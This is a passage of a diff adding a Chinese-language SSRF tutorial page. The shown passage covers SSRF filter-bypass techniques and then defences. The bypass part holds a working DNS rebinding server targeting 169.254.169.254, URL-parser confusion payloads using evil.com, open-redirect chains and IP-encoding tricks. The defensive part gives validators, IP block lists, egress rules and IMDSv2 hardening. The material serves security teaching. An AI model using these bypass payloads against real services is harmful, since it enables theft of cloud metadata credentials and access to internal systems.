+# 交替解析为 127.0.0.1 和 169.254.169.254
+
+# 2. 使用 Singularity of Origin 工具
+# https://github.com/nccgroup/singularity
+# 自建DNS rebinding服务器
+
+# 3. 自建 DNS 服务器 (Python)
+from dnslib.server import DNSServer, BaseResolver
+from dnslib import RR, A, QTYPE
+import threading
+
+class RebindResolver(BaseResolver):
+    def __init__(self):
+        self.counter = {}
+
+    def resolve(self, request, handler):
+        qname = str(request.q.qname)
+        reply = request.reply()
+
+        if qname not in self.counter:
+            self.counter[qname] = 0
+
+        self.counter[qname] += 1
+
+        if self.counter[qname] % 2 == 1:
+            # 第一次：返回合法IP
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A("8.8.8.8"), ttl=0))
+        else:
+            # 第二次：返回内网IP
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A("169.254.169.254"), ttl=0))
+
+        return reply
+
+resolver = RebindResolver()
+server = DNSServer(resolver, port=53, address="0.0.0.0")
+server.start()</code></pre>
+
+    <h3>5.3 URL 解析不一致</h3>
+    <pre><code># 不同 URL 解析库对相同 URL 的理解可能不同
+# 验证层和请求层使用不同的解析器时可以绕过
+
+# === @ 符号混淆 ===
+# URL 格式: scheme://username:password@hostname:port/path
+# 如果应用只检查 hostname 部分，但解析有误：
+
+http://expected-host@evil.com/
+# 某些解析器认为 host = expected-host（通过验证）
+# 实际请求发送到 evil.com
+
+http://evil.com@expected-host/
+# 某些解析器认为 host = expected-host（通过验证）
+# 但某些 HTTP 客户端连接 evil.com
+
+# === 反斜杠混淆 ===
+http://evil.com\@expected-host/
+# 不同解析器对 \ 的处理不同
+
+# === URL Fragment (#) ===
+http://expected-host#@evil.com/
+# 某些解析器忽略 # 后面的内容
+
+# === 多重 URL 编码 ===
+# 127.0.0.1 → %31%32%37%2e%30%2e%30%2e%31 (第一次编码)
+# → %25%33%31%25%33%32%25%33%37... (第二次编码)
+# 如果应用解码一次后验证，但 HTTP 客户端再解码一次
+
+# === Unicode/IDNA 域名 ===
+# 某些 Unicode 字符在 IDNA 编码后等同于 ASCII
+# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ 可能被解析为 example.com
+
+# === 使用 enclosed alphanumerics ===
+http://①②⑦.⓪.⓪.①/  # 某些环境下被解析为 127.0.0.1</code></pre>
+
+    <h3>5.4 Open Redirect 链式攻击</h3>
+    <pre><code># 如果应用只验证初始URL的域名
+# 但允许的域名存在 Open Redirect 漏洞
+
+# 应用白名单: 只允许请求 trusted-cdn.com
+# 但 trusted-cdn.com 有开放重定向:
+# https://trusted-cdn.com/redirect?url=http://169.254.169.254/
+
+# 攻击：
+GET /fetch?url=https://trusted-cdn.com/redirect?url=http://169.254.169.254/latest/meta-data/
+
+# 请求链：
+# 1. 应用验证 URL → trusted-cdn.com → 在白名单中 ✓
+# 2. 应用请求 trusted-cdn.com/redirect?url=...
+# 3. trusted-cdn.com 返回 302 重定向到 169.254.169.254
+# 4. HTTP 客户端跟随重定向 → 访问到元数据服务！
+
+# 常见存在 Open Redirect 的地方：
+# - OAuth 回调: /oauth/callback?redirect_uri=
+# - 登录跳转: /login?next=
+# - 短链服务: /go?url=
+# - CDN/图片代理: /proxy?src=
+
+# 防御：禁止 HTTP 客户端跟随重定向，或在每次重定向时重新验证目标</code></pre>
+
+    <h3>5.5 其他绕过技巧</h3>
+    <pre><code># === 通配符 DNS 服务 ===
+# 这些服务将任何子域名解析为指定的 IP
+
+# nip.io
+http://169.254.169.254.nip.io/       → 解析为 169.254.169.254
+http://192.168.1.100.nip.io/          → 解析为 192.168.1.100
+http://app.10.0.0.1.nip.io/           → 解析为 10.0.0.1
+
+# sslip.io
+http://169-254-169-254.sslip.io/     → 解析为 169.254.169.254
+
+# === 短URL / URL缩短服务 ===
+# 将内网地址通过短URL服务包装
+http://bit.ly/xxxx → 重定向到 http://169.254.169.254/
+
+# === CNAME 指向内网 ===
+# 设置自己域名的 CNAME 记录
+# attacker.com CNAME → internal-service.corp.local
+# 但通常需要 DNS 能解析 internal-service
+
+# === 利用URL中的空白字符 ===
+http://127.0.0.1 (空格后接真实URL)
+http://127。0。0。1/  (全角句号)
+
+# === 利用不同的 IP 表示方法组合 ===
+# 少见但有效的绕过方式一览：
+http://0177.1/                    # 八进制 + 省略
+http://0x7f.1/                    # 十六进制 + 省略
+http://127.0.0.1./                # 末尾点号
+http://127.0.0.1:80/              # 显式端口
+http://127.0.0.1:80\@google.com/  # 混淆
+http://[0:0:0:0:0:ffff:127.0.0.1]/ # IPv4-mapped IPv6</code></pre>
+
+    <h3>5.6 绕过技术汇总表</h3>
+    <table>
+      <thead><tr><th>绕过方法</th><th>适用场景</th><th>示例</th><th>成功率</th></tr></thead>
+      <tbody>
+        <tr><td>IP 进制转换</td><td>黑名单过滤特定IP字符串</td><td><code>http://2130706433/</code></td><td>高</td></tr>
+        <tr><td>IPv6 表示</td><td>只过滤了 IPv4 格式</td><td><code>http://[::1]/</code></td><td>中</td></tr>
+        <tr><td>DNS Rebinding</td><td>先验证IP再请求</td><td>TTL=0 的恶意 DNS</td><td>中</td></tr>
+        <tr><td>URL 解析差异</td><td>验证和请求使用不同解析器</td><td><code>http://x@evil.com/</code></td><td>低-中</td></tr>
+        <tr><td>Open Redirect</td><td>白名单域名有重定向</td><td>信任域 302 跳转</td><td>高</td></tr>
+        <tr><td>通配符 DNS</td><td>黑名单过滤IP但不过滤域名</td><td><code>x.nip.io</code></td><td>高</td></tr>
+        <tr><td>协议切换</td><td>只过滤 http 协议</td><td><code>gopher://</code>, <code>dict://</code></td><td>中</td></tr>
+        <tr><td>URL 编码</td><td>未解码就验证</td><td><code>%31%32%37%2e%30%2e%30%2e%31</code></td><td>低</td></tr>
+        <tr><td>302 跳转</td><td>只验证首次请求目标</td><td>自建服务器返回 302</td><td>高</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 6 -->
+    <h2 id="defense">6. 防御方案</h2>
+
+    <div class="info-box success">
+      <div class="box-title">SSRF 防御核心思想</div>
+      <p>防御 SSRF 需要<strong>多层防御（Defense in Depth）</strong>：应用层验证 + 网络层隔离 + 云平台加固，缺一不可。单靠任何一层都可能被绕过。</p>
+    </div>
+
+    <h3>6.1 应用层：输入验证</h3>
+    <pre><code># ✅ 方案1：白名单验证（最推荐）
+import ipaddress
+from urllib.parse import urlparse
+import socket
+
+# 定义允许的域名白名单
+ALLOWED_DOMAINS = {
+    'api.example.com',
+    'cdn.example.com',
+    'images.example.com'
+}
+
+# 定义禁止的 IP 范围（内网 + 特殊地址）
+BLOCKED_NETWORKS = [
+    ipaddress.ip_network('10.0.0.0/8'),
+    ipaddress.ip_network('172.16.0.0/12'),
+    ipaddress.ip_network('192.168.0.0/16'),
+    ipaddress.ip_network('127.0.0.0/8'),
+    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (元数据!)
+    ipaddress.ip_network('100.100.100.0/24'),  # 阿里云元数据
+    ipaddress.ip_network('0.0.0.0/8'),
+    ipaddress.ip_network('::1/128'),          # IPv6 localhost
+    ipaddress.ip_network('fc00::/7'),         # IPv6 ULA
+    ipaddress.ip_network('fe80::/10'),        # IPv6 Link-local
+]
+
+def is_safe_url(url: str) -> bool:
+    """综合验证 URL 是否安全"""
+    try:
+        parsed = urlparse(url)
+
+        # 1. 协议白名单
+        if parsed.scheme not in ('http', 'https'):
+            return False
+
+        # 2. 域名白名单（如果使用白名单策略）
+        if parsed.hostname not in ALLOWED_DOMAINS:
+            return False
+
+        # 3. 解析域名得到 IP，检查 IP 是否在禁止范围
+        # 重要：必须解析后检查，防止 DNS Rebinding 等绕过
+        ip_addr = socket.getaddrinfo(parsed.hostname, parsed.port or 443)[0][4][0]
+        ip = ipaddress.ip_address(ip_addr)
+
+        for network in BLOCKED_NETWORKS:
+            if ip in network:
+                return False
+
+        # 4. 端口白名单
+        allowed_ports = {80, 443}
+        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+        if port not in allowed_ports:
+            return False
+
+        return True
+
+    except (ValueError, socket.gaierror, OSError):
+        return False
+
+# 使用示例
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+
+    if not is_safe_url(url):
+        return jsonify({"error": "URL not allowed"}), 403
+
+    # 关键：使用解析后的 IP 直接发起请求（防止 DNS Rebinding）
+    parsed = urlparse(url)
+    ip_addr = socket.getaddrinfo(parsed.hostname, None)[0][4][0]
+    # 用 IP 替换域名发起请求，避免二次 DNS 解析
+    safe_url = url.replace(parsed.hostname, ip_addr)
+    response = requests.get(safe_url, headers={'Host': parsed.hostname},
+                           allow_redirects=False,  # 禁止跟随重定向！
+                           timeout=5)
+    return response.text</code></pre>
+
+    <h3>6.2 应用层：禁止重定向跟随</h3>
+    <pre><code># ✅ 禁止 HTTP 客户端自动跟随重定向
+# 如果必须跟随重定向，则每次重定向都要重新验证目标
+
+import requests
+
+def safe_fetch(url: str, max_redirects: int = 3) -> requests.Response:
+    """安全的 URL 获取，手动处理重定向"""
+    for i in range(max_redirects + 1):
+        if not is_safe_url(url):
+            raise ValueError(f"Redirect to blocked URL: {url}")
+
+        resp = requests.get(url, allow_redirects=False, timeout=5)
+
+        if resp.status_code in (301, 302, 303, 307, 308):
+            url = resp.headers.get('Location', '')
+            if not url:
+                raise ValueError("Empty redirect location")
+            continue
+        else:
+            return resp
+
+    raise ValueError("Too many redirects")
+
+# Java 示例
+# HttpURLConnection 默认跟随重定向，必须禁用
+# HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+# conn.setInstanceFollowRedirects(false);  // 禁止自动重定向</code></pre>
+
+    <h3>6.3 应用层：禁用不必要的 URL Schema</h3>
+    <pre><code># ✅ 只允许 http/https，禁用所有其他协议
+
+# Python - 自定义 Transport Adapter
+from requests.adapters import HTTPAdapter
+
+class SafeHTTPAdapter(HTTPAdapter):
+    """只允许 HTTP/HTTPS 协议"""
+    def send(self, request, **kwargs):
+        if not request.url.startswith(('http://', 'https://')):
+            raise ValueError(f"Blocked protocol: {request.url}")
+        return super().send(request, **kwargs)
+
+session = requests.Session()
+session.mount('http://', SafeHTTPAdapter())
+session.mount('https://', SafeHTTPAdapter())
+# file://, dict://, gopher:// 等协议不会被处理
+
+# Java - 使用 HttpClient 而非 URLConnection
+# URLConnection 支持 file://, jar:// 等危险协议
+# HttpClient 只支持 HTTP/HTTPS
+
+# ❌ 危险: new URL(userInput).openStream()
+# ✅ 安全: HttpClient.newHttpClient().send(request, ...)
+
+# PHP - 禁用 cURL 的危险协议
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+// 禁止 file://, dict://, gopher:// 等</code></pre>
+
+    <h3>6.4 网络层：分段隔离</h3>
+
+    <div class="diagram">网络分段防御 SSRF：
+
+                 ┌────────────────────────────────────────────┐
+                 │           网络架构（改进后）                  │
+                 │                                            │
+  互联网         │    DMZ 区域          │     内网区域         │
+ ─────────────── │ ─────────────────── │ ─────────────────── │
+                 │                     │                     │
+  ┌──────┐       │   ┌──────────┐     │   ┌──────────┐     │
+  │用户/  │──────│──→│ Web 服务器│     │   │ 数据库    │     │
+  │攻击者 │       │   │ (应用层)  │     │   │ Redis     │     │
+  └──────┘       │   └─────┬────┘     │   │ ES        │     │
+                 │         │          │   └──────────┘     │
+                 │         │ 只允许    │         ↑          │
+                 │         │ 特定流量  │         │          │
+                 │         ▼          │         │          │
+                 │   ┌──────────┐     │   防火墙规则：      │
+                 │   │ API 网关  │─────│──→ 只允许 API 网关  │
+                 │   │ (鉴权+ACL)│     │   访问数据库       │
+                 │   └──────────┘     │                    │
+                 │                     │   Web 服务器       │
+                 │                     │   → 不能直接访问    │
+                 │                     │     数据库端口      │
+                 └────────────────────────────────────────────┘
+
+关键措施：
+  ✓ Web 应用服务器不能直接访问数据库/缓存端口
+  ✓ 元数据服务只允许特定安全组访问
+  ✓ 内部服务之间使用 mTLS 认证
+  ✓ 即使 SSRF 成功，也无法到达关键内部服务</div>
+
+    <pre><code># AWS 安全组示例：限制元数据访问
+# iptables 规则（在实例上阻止对元数据的非授权访问）
+
+# 只允许 root 用户访问元数据（应用以非 root 运行）
+iptables -A OUTPUT -m owner --uid-owner root -d 169.254.169.254 -j ACCEPT
+iptables -A OUTPUT -d 169.254.169.254 -j DROP
+
+# 或者完全阻止对元数据的访问（如果应用不需要）
+iptables -A OUTPUT -d 169.254.169.254 -j DROP
+
+# Kubernetes NetworkPolicy：限制 Pod 出站流量
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: restrict-egress
+spec:
+  podSelector:
+    matchLabels:
+      app: web-frontend
+  policyTypes:
+    - Egress
+  egress:
+    - to:
+        - podSelector:
+            matchLabels:
+              app: backend-api  # 只允许访问后端 API
+      ports:
+        - port: 8080
+    - to:
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except:
+              - 10.0.0.0/8       # 禁止访问内网
+              - 172.16.0.0/12
+              - 192.168.0.0/16
+              - 169.254.0.0/16   # 禁止访问元数据</code></pre>
+
+    <h3>6.5 云平台：IMDSv2 加固</h3>
+
+    <div class="info-box success">
+      <div class="box-title">IMDSv2：AWS 元数据服务的重大安全升级</div>
+      <p>AWS Instance Metadata Service v2 (IMDSv2) 要求使用 <strong>PUT 请求获取 Session Token</strong>，然后在后续请求中携带该 Token。由于大多数 SSRF 只能发起 GET 请求，IMDSv2 能有效防御通过 SSRF 窃取元数据凭证。</p>
+    </div>
+
+    <pre><code># === IMDSv1（不安全，已被 SSRF 多次利用） ===
+# 简单 GET 请求即可获取元数据
+curl http://169.254.169.254/latest/meta-data/
+# → 直接返回元数据，无需任何认证
+
+# === IMDSv2（安全） ===
+# Step 1: 必须先用 PUT 请求获取 Token
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+
+# Step 2: 使用 Token 获取元数据
+curl http://169.254.169.254/latest/meta-data/ \
+  -H "X-aws-ec2-metadata-token: $TOKEN"
+
+# 为什么 IMDSv2 能防御 SSRF：
+# 1. 大多数 SSRF 只能发起 GET 请求（无法发 PUT）
+# 2. 即使能发 PUT，也需要设置自定义 Header
+# 3. gopher:// 虽然可以构造 PUT，但 Token 有 TTL，需要两步操作
+# 4. 即使 Token 泄露，也有 hop limit = 1（不允许从容器/转发获取）
+
+# === 强制使用 IMDSv2（AWS CLI/Terraform） ===
+# AWS CLI
+aws ec2 modify-instance-metadata-options \
+  --instance-id i-1234567890abcdef0 \
+  --http-tokens required \           # 强制使用 IMDSv2
+  --http-put-response-hop-limit 1 \  # 限制 Token 传播
+  --http-endpoint enabled
+
+# Terraform
+resource "aws_instance" "web" {
+  # ...
+  metadata_options {
+    http_endpoint               = "enabled"
+    http_tokens                 = "required"  # 强制 IMDSv2
+    http_put_response_hop_limit = 1
+  }
+}
+
+# GCP 等效措施：要求 Metadata-Flavor: Google Header
+# Azure 等效措施：要求 Metadata: true Header
+# 这些 Header 要求也能阻止大部分基本 SSRF（无法设置自定义 Header）</code></pre>
+
+    <h3>6.6 综合防御代码示例（生产级别）</h3>
+    <pre><code>"""
+生产级别的 SSRF 防御模块
+结合多层验证，防御各类绕过手法
+"""
+import ipaddress
+import socket
+import re
+from urllib.parse import urlparse, urljoin
+from typing import Optional, Tuple
+import requests
+from requests.adapters import HTTPAdapter
+
+class SSRFProtector:
+    """SSRF 防护类"""
+
+    # 私有/保留 IP 范围
+    BLOCKED_NETWORKS = [
+        ipaddress.ip_network('0.0.0.0/8'),
+        ipaddress.ip_network('10.0.0.0/8'),
+        ipaddress.ip_network('100.64.0.0/10'),   # Carrier-grade NAT
+        ipaddress.ip_network('127.0.0.0/8'),
+        ipaddress.ip_network('169.254.0.0/16'),  # Link-local / 云元数据
+        ipaddress.ip_network('172.16.0.0/12'),
+        ipaddress.ip_network('192.0.0.0/24'),
+        ipaddress.ip_network('192.168.0.0/16'),
+        ipaddress.ip_network('198.18.0.0/15'),   # Benchmark
+        ipaddress.ip_network('224.0.0.0/4'),     # Multicast
+        ipaddress.ip_network('240.0.0.0/4'),     # Reserved
+        ipaddress.ip_network('255.255.255.255/32'),
+        # IPv6
+        ipaddress.ip_network('::1/128'),
+        ipaddress.ip_network('fc00::/7'),        # Unique local
+        ipaddress.ip_network('fe80::/10'),       # Link-local
+        ipaddress.ip_network('::ffff:0:0/96'),   # IPv4-mapped
+    ]
+
+    ALLOWED_SCHEMES = {'http', 'https'}
+    ALLOWED_PORTS = {80, 443, 8080, 8443}
+    MAX_REDIRECTS = 5
+    TIMEOUT = 10
+
+    def __init__(self, allowed_domains: Optional[set] = None):
+        self.allowed_domains = allowed_domains
+        self.session = requests.Session()
+        self.session.max_redirects = 0  # 手动处理重定向
+
+    def _is_private_ip(self, ip_str: str) -> bool:
+        """检查 IP 是否在私有/保留范围"""
+        try:
+            ip = ipaddress.ip_address(ip_str)
+            return any(ip in network for network in self.BLOCKED_NETWORKS)
+        except ValueError:
+            return True  # 无法解析则默认拒绝
+
+    def _resolve_hostname(self, hostname: str) -> str:
+        """解析域名并验证结果 IP"""
+        try:
+            # 使用 getaddrinfo 解析（支持 IPv4/IPv6）
+            results = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC)
+            if not results:
+                raise ValueError(f"Cannot resolve: {hostname}")
+
+            ip_str = results[0][4][0]
+
+            if self._is_private_ip(ip_str):
+                raise ValueError(
+                    f"Hostname {hostname} resolves to private IP: {ip_str}"
+                )
+
+            return ip_str
+        except socket.gaierror:
+            raise ValueError(f"DNS resolution failed: {hostname}")
+
+    def validate_url(self, url: str) -> Tuple[str, str]:
+        """
+        验证 URL 安全性
+        返回: (validated_url, resolved_ip)
+        """
+        # 1. 基本 URL 解析
+        try:
+            parsed = urlparse(url)
+        except Exception:
+            raise ValueError("Invalid URL format")
+
+        # 2. 协议验证
+        if parsed.scheme.lower() not in self.ALLOWED_SCHEMES:
+            raise ValueError(f"Blocked scheme: {parsed.scheme}")
+
+        # 3. 主机名验证
+        hostname = parsed.hostname
+        if not hostname:
+            raise ValueError("Missing hostname")
+
+        # 4. 域名白名单（如果配置了）
+        if self.allowed_domains and hostname not in self.allowed_domains:
+            raise ValueError(f"Domain not in allowlist: {hostname}")
+
+        # 5. 端口验证
+        port = parsed.port
+        if port and port not in self.ALLOWED_PORTS:
+            raise ValueError(f"Blocked port: {port}")
+
+        # 6. DNS 解析 + IP 验证（防止 DNS Rebinding 的第一步）
+        resolved_ip = self._resolve_hostname(hostname)
+
+        # 7. 检查是否是 IP 直接输入（额外验证各种进制表示）
+        # 尝试把 hostname 直接解析为 IP
+        try:
+            direct_ip = ipaddress.ip_address(hostname)
+            if self._is_private_ip(str(direct_ip)):
+                raise ValueError(f"Direct private IP not allowed: {hostname}")
+        except ValueError:
+            pass  # 不是直接 IP，是域名，已经在上面验证过了
+
+        return (url, resolved_ip)
+
+    def safe_request(self, url: str, method: str = 'GET',
+                     **kwargs) -> requests.Response:
+        """
+        安全地发起 HTTP 请求
+        自动处理重定向验证
+        """
+        redirects = 0
+
+        while redirects <= self.MAX_REDIRECTS:
+            # 每次请求前都验证 URL
+            validated_url, resolved_ip = self.validate_url(url)
+
+            # 使用解析后的 IP 发起请求（防止 DNS Rebinding）
+            parsed = urlparse(validated_url)
+            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+
+            # 替换 hostname 为 IP，设置 Host header
+            actual_url = validated_url.replace(
+                parsed.hostname, resolved_ip
+            )
+
+            headers = kwargs.pop('headers', {})
+            headers['Host'] = parsed.hostname
+
+            resp = self.session.request(
+                method, actual_url,
+                headers=headers,
+                allow_redirects=False,
+                timeout=self.TIMEOUT,
+                verify=True,
+                **kwargs
+            )
+
+            # 处理重定向
+            if resp.status_code in (301, 302, 303, 307, 308):
+                redirects += 1
+                location = resp.headers.get('Location', '')
+                if not location:
+                    raise ValueError("Empty redirect location")
+                # 处理相对 URL
+                url = urljoin(validated_url, location)
+                continue
+
+            return resp
+
+        raise ValueError("Too many redirects")
+
+
+# === 使用示例 ===
+protector = SSRFProtector(
+    allowed_domains={'api.github.com', 'cdn.example.com'}
+)
+
+@app.route('/proxy')
+def proxy_request():
+    url = request.args.get('url')
+    try:
+        resp = protector.safe_request(url)
+        return resp.text, resp.status_code
+    except ValueError as e:
+        return jsonify({"error": str(e)}), 403</code></pre>
+
+    <h3>6.7 防御检查清单</h3>
+    <table>
+      <thead><tr><th>层面</th><th>措施</th><th>防御的攻击</th><th>优先级</th></tr></thead>
+      <tbody>
+        <tr><td>应用层</td><td>URL 白名单（允许的域名/IP）</td><td>所有 SSRF</td><td>P0</td></tr>
+        <tr><td>应用层</td><td>禁用 file://, dict://, gopher:// 等协议</td><td>协议滥用</td><td>P0</td></tr>
+        <tr><td>应用层</td><td>DNS 解析后验证 IP + 用 IP 发请求</td><td>DNS Rebinding</td><td>P0</td></tr>
+        <tr><td>应用层</td><td>禁止/手动处理 HTTP 重定向</td><td>Open Redirect 链</td><td>P1</td></tr>
+        <tr><td>应用层</td><td>统一 URL 解析库</td><td>解析不一致绕过</td><td>P1</td></tr>
+        <tr><td>应用层</td><td>响应内容过滤（不返回原始响应）</td><td>信息泄露</td><td>P2</td></tr>
+        <tr><td>网络层</td><td>出站流量防火墙（Egress filtering）</td><td>内网访问</td><td>P0</td></tr>
+        <tr><td>网络层</td><td>网络分段（微服务间 ACL）</td><td>横向移动</td><td>P1</td></tr>
+        <tr><td>网络层</td><td>服务间 mTLS 认证</td><td>未授权内部访问</td><td>P1</td></tr>
+        <tr><td>云平台</td><td>启用 IMDSv2（AWS）/ 等效方案</td><td>元数据窃取</td><td>P0</td></tr>
+        <tr><td>云平台</td><td>最小权限 IAM Role</td><td>凭证滥用范围</td><td>P0</td></tr>
+        <tr><td>云平台</td><td>VPC Endpoint 限制</td><td>非预期服务访问</td><td>P2</td></tr>
+        <tr><td>监控</td><td>记录所有出站请求日志</td><td>事后追溯</td><td>P1</td></tr>
+        <tr><td>监控</td><td>异常出站连接告警</td><td>实时检测</td><td>P1</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box danger">
+      <div class="box-title">常见防御误区</div>
+      <ul>
+        <li><strong>❌ 只用黑名单过滤 IP</strong> — 可通过进制转换、DNS Rebinding 等轻易绕过</li>
+        <li><strong>❌ 只验证域名不验证解析后 IP</strong> — 攻击者控制的域名可以指向任何 IP</li>
+        <li><strong>❌ 验证后重新解析域名发请求</strong> — DNS Rebinding 的经典利用场景</li>
+        <li><strong>❌ 只禁用 http/https 以外协议但不限制目标</strong> — HTTP 本身就能访问内网</li>
+        <li><strong>❌ 依赖正则表达式验证 URL</strong> — URL 解析极其复杂，正则必然有遗漏</li>
+        <li><strong>❌ 允许 HTTP 重定向跟随但不验证重定向目标</strong> — Open Redirect 绕过</li>
+      </ul>
+    </div>
+
+    <div class="nav-footer">
+      <a href="A09_日志监控失效.html">&larr; A09: 日志监控失效</a>
+      <a href="../index.html">返回首页 &rarr;</a>
+    </div>
+  </main>
+</div>
+</body>
+</html>
